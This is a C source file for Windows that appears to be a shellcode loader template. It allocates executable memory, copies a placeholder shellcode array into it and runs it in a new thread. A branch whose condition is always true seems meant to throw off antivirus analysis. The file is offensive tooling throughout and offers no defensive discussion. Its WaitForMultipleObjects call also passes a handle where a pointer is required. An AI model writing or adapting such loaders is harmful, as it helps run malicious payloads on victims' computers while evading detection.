#include <windows.h>
#include <time.h>

int len(char string[]);

int randomNumber(int min, int max);

int main(int argc, char* argv[]) {
	int a = randomNumber(0, 2);
	int b = a * 2 + 1;
	if (b != a) {
		unsigned char shellcode[] = {
			//SHELLCODE HERE
		};

		PVOID baseAddress = VirtualAlloc(
			0,
			sizeof(shellcode),
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);
		
		CopyMemory(
			baseAddress, 
			shellcode, 
			sizeof(shellcode)
		);

		HANDLE thread = CreateThread(
			NULL, 
			0, 
			(LPTHREAD_START_ROUTINE)baseAddress,
			NULL,
			0,
			0
		);

		WaitForMultipleObjects(
			1,
			thread, 
			FALSE,
			INFINITE
		);
	}

	return 0;
}


int len(char string[]) 
{
	int i = 0;
	while (string[i] != '\0'){
		i++;
	}

	return i;
}


int randomNumber(int min, int max) 
{
	srand(time(NULL));  
	int random = rand() % (max - min + 1) + min; 
	return random;
}